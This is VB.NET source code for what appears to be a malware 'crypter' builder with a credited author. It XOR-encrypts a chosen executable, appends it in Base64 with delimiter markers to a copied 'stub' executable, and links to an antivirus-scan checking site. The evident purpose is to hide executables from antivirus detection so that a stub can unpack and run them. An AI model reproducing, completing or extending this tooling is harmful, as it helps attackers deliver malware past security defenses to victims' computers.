﻿Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices
Public Class Cliente
    Const Dzkiller1 = "~Mr.Dzkiller~"
    Const Dzkiller2 = "~Made-in-Dz~"
    Dim Dz1, Dz2 As Boolean
    Dim RandomClass As New Random()
    Dim Algeria As SaveFileDialog = New SaveFileDialog

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Opacity = 70
        TextBox3.Text = RandomString(RandomClass.Next(20, 22))
    End Sub

    Private Sub EButton1_Click(sender As Object, e As EventArgs) Handles EButton1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
         {
             .Filter = "Executable |*.exe"
         }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.TextBox1.Text = openFileDialog.FileName
        End If
        EButton2.Visible = True
    End Sub

    Private Sub EButton2_Click(sender As Object, e As EventArgs) Handles EButton2.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
          {
              .Filter = "Stub |*.exe"
          }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.TextBox2.Text = openFileDialog.FileName
        End If
    End Sub

    Private Sub EButton3_Click(sender As Object, e As EventArgs) Handles EButton3.Click
        Dim Dzkiller As String

        If ((Me.TextBox1.Text = Nothing) Or (Me.TextBox2.Text = Nothing)) Then
            Interaction.MsgBox("Erro ! Stub", MsgBoxStyle.Information, Nothing)
        End If
        Try
            Using Algeria
                Algeria.Filter = "Executable Files (.exe)|*.exe"
                If (Algeria.ShowDialog = DialogResult.OK) Then
                    Dzkiller = Algeria.FileName
                Else
                    Return
                End If
            End Using
            Dim Alpha As Byte() = XOREncrypt(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text), Dzkiller1)
            File.Copy(Me.TextBox2.Text, Dzkiller)
            IO.File.AppendAllText(Dzkiller, Dzkiller2 & Convert.ToBase64String(Alpha) & Dzkiller2 & Me.TextBox3.Text & Dzkiller2 & Dz1 & Dzkiller2 & Dz2)
            Interaction.MsgBox("Success Protection Exe", MsgBoxStyle.Information, Nothing)

        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            Interaction.MsgBox("Error !", MsgBoxStyle.Critical, Nothing)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Function XOREncrypt(ByVal up As Byte(), ByVal BB2 As String) As Byte()
        Dim CL As Byte() = System.Text.Encoding.ASCII.GetBytes(BB2)
        Randomize()
        Dim FP As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim BA(up.Length) As Byte
        Dim KA As Integer
        For MP As Integer = 0 To up.Length - 1
            BA(MP) += (up(MP) Xor CL(KA)) Xor FP
            If KA = BB2.Length - 1 Then KA = 0 Else KA = KA + 1
        Next
        BA(up.Length) = 112 Xor FP
        Return BA
    End Function

    Public Shared Function RandomString(ByVal lenght As Integer) As Object
        Dim str As String = "шрревеПаисеъолвнзМреIацеIеилцвПвOсошааиЙиееееЙслрощЙиснвонеПсиаеаащеенМаоетМнлввзнвавинеМаоМалееерее"
        Dim random As System.Random = New System.Random()
        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
        Dim num As Integer = lenght
        Dim num1 As Integer = 1
        Do
            Dim num2 As Integer = random.[Next](0, 35)
            stringBuilder.Append(str.Substring(num2, 1))
            num1 = num1 + 1
        Loop While num1 <= num
        Return stringBuilder.ToString()
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        MessageBox.Show("Coded Pjoao1578", "Skype = pjoao1578", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Me.Close()
    End Sub

    Private Sub EButton4_Click(sender As Object, e As EventArgs) Handles EButton4.Click
        Process.Start("http://www.check4you.net/")
    End Sub

    Private Sub ETheme1_Click(sender As Object, e As EventArgs) Handles ETheme1.Click
        Me.Opacity = 70
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Me.Opacity = 70
    End Sub
End Class